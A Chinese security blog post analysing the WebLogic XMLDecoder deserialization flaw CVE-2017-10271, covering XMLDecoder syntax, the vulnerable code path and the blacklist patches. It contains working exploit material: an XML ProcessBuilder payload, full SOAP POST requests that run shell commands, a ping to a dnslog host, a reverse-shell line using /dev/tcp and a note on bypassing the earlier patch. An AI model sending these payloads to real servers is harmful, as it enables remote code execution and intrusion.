---
title: Weblogic XMLDecoder反序列化
date: 2026-10-09
---

# Weblogic XMLDecoder反序列化

## 前言

CVE-2017-3506 是 XMLDecoder 反序列化的漏洞，Weblogic 的 CVE-2017-10271 则是对 CVE-2017-3506 补丁的绕过。这里主要分析 CVE-2017-10271。

这里的漏洞环境和 Weblogic T3 反序列化的环境是一样的。

## 漏洞分析与复现

### XMLDecoder 与 XMLEncoder

XMLDecoder 和 XMLEncoder 是在 JDK1.4 中添加的 XML 格式序列化持久性方案，使用 XMLEncoder 来生成表示 JavaBeans 组件(bean)的 XML 文档，用 XMLDecoder 读取使用 XMLEncoder 创建的 XML 文档获取 JavaBeans。

#### XMLEncoder

```java
package org.example;

import javax.swing.*;
import java.beans.XMLEncoder;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;

public class EncoderTest {
    public static void main(String[] args) throws Exception{
        FileOutputStream file = new FileOutputStream("result.xml");
        XMLEncoder xmlEncoder = new XMLEncoder(new BufferedOutputStream(file));
        xmlEncoder.writeObject(new JButton("Hello,xml"));
        xmlEncoder.close();
    }
}
```

序列化了`JButton`类，得到的 XML 文档如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_65" class="java.beans.XMLDecoder">
 <object class="javax.swing.JButton">
  <string>Hello,xml</string>
 </object>
</java>
```

#### XMLDecoder

```java
package org.example;

import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.FileInputStream;

public class DecoderTest {
    public static void main(String[] args) throws Exception{
        FileInputStream file = new FileInputStream("result.xml");
        XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file));
        Object o = xmlDecoder.readObject();
        System.out.println(o);
        xmlDecoder.close();
    }
}
```

使用 XMLDecoder 读取序列化的 XML 文档，获取`JButton`类并打印：

```text
javax.swing.JButton[,0,0,0x0,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@7cd84586,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=14,bottom=2,right=14],paintBorder=true,paintFocus=true,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Hello,xml,defaultCapable=true]
```

#### XML 基础属性

##### string 标签

`hello,xml` 字符串的表示方式为 `<string>Hello,xml</string>`。

##### object 标签

通过`<object>`标签表示对象，`class`属性指定具体的类（用于调用其内部的方法），`method`属性指定具体的方法名称（比如构造函数的方法名`new`）。

比如：

```xml
<object class="javax.swing.JButton" method="new">
    <string>Hello,xml</string>
</object>
```

这里其实比较特殊，涉及到 XMLEncoder 的对象创建方式。

**方式 A：无参构造+setter**

如果对象能通过**无参构造**创建，再通过`setter`设置属性，`XMLEncoder`就优先这样写：

```xml
<object class="javax.swing.JButton">
    <string>Hello,xml</string>
</object>
```

这里的`<string>`实际上就是给`JButton`的`text`属性赋值，**语义等价于：**

```java
JButton btn = new JButton();
btn.setText("Hello,xml");
```

`<object>`**没有默认属性时，默认的就是调用无参构造。**

**方式B：有参构造（显式 method="new"）**

如果对象只能通过有参构造创建，或者编码器觉得用构造方法，就会写成：

```xml
<object class="javax.swing.JButton" method="new">
    <string>Hello,xml</string>
</object>
```

这里`<string>`是**构造方法的参数**，语义是：

```java
new JButton("Hello,xml");
```

此时`method="new"`**必须显式写出**，用来区分“构造参数”和属性赋值。

##### void 标签

通过`void`标签表示函数调用、赋值等操作，`method`属性指定具体的方法名称。比如`JButton b = new JButton();b.setText("Hello, world");`对应的 XML 文档：

```xml
<object class="javax.swing.JButton">
    <void method="setText">
    	<string>Hello,xml</string>
    </void>
</object>
```

##### array 标签

通过`array`标签表示数组，`class`属性指定具体类，内部`void`标签的`index`属性表示根据指定数组索引赋值，`String[] s = new String[3];s[1] = "Hello,xml";`对应的 XML 文档：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_65" class="java.beans.XMLDecoder">
 <array class="java.lang.String" length="3">
  <void index="1">
   <string>Hello,xml</string>
  </void>
 </array>
</java>
```

### 漏洞原理

这个漏洞的影响范围比较广，WebLogic 存在 WLS-WebServices 的组件皆会受到影响。

Weblogic 的 WLS Security 组件对外提供 WebService 服务，其中使用 XMLDecoder 来解析 XML 格式数据，其存在反序列化漏洞，从而导致 RCE。

先写一个 XML 反序列化导致 RCE 的样例：

```java
package org.example;

import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.FileInputStream;

public class DecodeRCE {
    public static void main(String[] args) throws Exception{
        FileInputStream file = new FileInputStream("D:\\JavaSecTestCode\\poc.xml");
        XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file));
        Object o = xmlDecoder.readObject();
        xmlDecoder.close();
    }
}
```

```xml
<java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="1">
            <void index="0">
                <string>Calc</string>
            </void>
        </array>
        <void method="start"/></void>
</java>
```

使用`ProcessBuilder`进行代码执行，XML 反序列化之后相当于执行：

```java
String[] cmd = new String[1];
cmd[0] = "Calc";
new ProcessBuilder(cmd).start();
```

### 漏洞分析

#### 复现

Weblogic 本质上是一个 Web Service 服务，报文内容类型是 SOAP 型 WebService 报文，所以`/wls-wsat/CoordinatorPortType`接口可以接收 XML 数据的请求包。

构造的恶意 POST 包：

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.110.128:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 615

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>whoami > /tmp/whoami_result
</string>
</void>
</array>
<void method="start"/>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

用 bp 发包确实是会 500，但是命令能够执行成功。如果是要反弹 shell，或者执行 ping 命令进行探测，POST 包：

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.110.128:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 596

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>ping weblogic.16qkmh.dnslog.cn
</string>
</void>
</array>
<void method="start"/>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

如果是弹 shell，需要把命令执行的地方进行修改：

```xml
<string>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</string>
```

#### 分析

首先可以看到`server/lib/wls-wsat.war/WEB-INF/web.xml`文件中存在许多接口，这些接口都可以对 SOAP 报文进行处理，也就是说，这些接口都存在 Weblogic XMLDecoder 反序列化漏洞。

![1](https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/urlPattern.png)

接着到`server\lib\weblogic.jar!\weblogic\wsee\jaxws\workcontext\WorkContextServerTube`的`processRequest`方法，这个方法对接口数据进行了初步的处理，打个断点进行调试。

![1](https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/processRequest.png)

这里`var1`就是我们的恶意 XML 数据，`var2`获取了 XML Header，也就是`text/xml`，并将其转化为列表形式，`var3`是从`var2`中获取`WorkAreaConstants.WORK_AREA_HEADER`得到的，最好将`var3`放入`readHeaderOld()`方法进行处理。

![1](https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/BeforeVar6.png)

跟进，在构造到`var6`之前，本质都是在进行赋值，`var4`获取了恶意 XML 数据里的内容部分。`var6`的构造就跟进到`WorkContextXmlInputAdapter`中。

![1](https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/WorkContextXmlInputAdapter.png)

这里可以看到本质上是`new`了一个`XMLDecoder`类，并将`var4`的恶意 XML 数据传了进去。然后跟进到`receive()`方法中。

![1](https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/receive.png)

`receive()`方法生成了处理 XMLDecoder 类的处理器，进行下一步`receiveRequest()`的处理，再继续跟进。

![1](https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/receiveRequestOld.png)

再跟进`readEntry()`方法，其中调用了`readUTF()`方法，跟进`readUTF()`方法，上面一直在做层层封装的工作。

![1](https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/readEntry.png)

在`readUTF()`方法中，调用了`readObject()`方法，对 XML 数据进行反序列化。

![1](https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/readUTF.png)

## 漏洞修复

### CVE-2017-3506 补丁分析

这里的补丁在`WorkContextXmlInputAdapter`中添加了`validate`验证，限制了`object`标签，从而限制通过 XML 来构造类：

```java
private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase("object")) {
                  throw new IllegalStateException("Invalid context type: object");
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException("Parser Exception", var5);
      } catch (SAXException var6) {
         throw new IllegalStateException("Parser Exception", var6);
      } catch (IOException var7) {
         throw new IllegalStateException("Parser Exception", var7);
      }
   }
```

绕过也很简单，将`object`修改为`void`即可。

### CVE-2017-10271 补丁分析

```java
private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
                  String var9 = attributes.getValue("class");
                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }
```

依然是黑名单，不过更加全面了。

## 总结

整体漏洞还是相对简单的，很快就能看过去，这个漏洞实际上也为很多 Web Service 的组件提供了思路。













































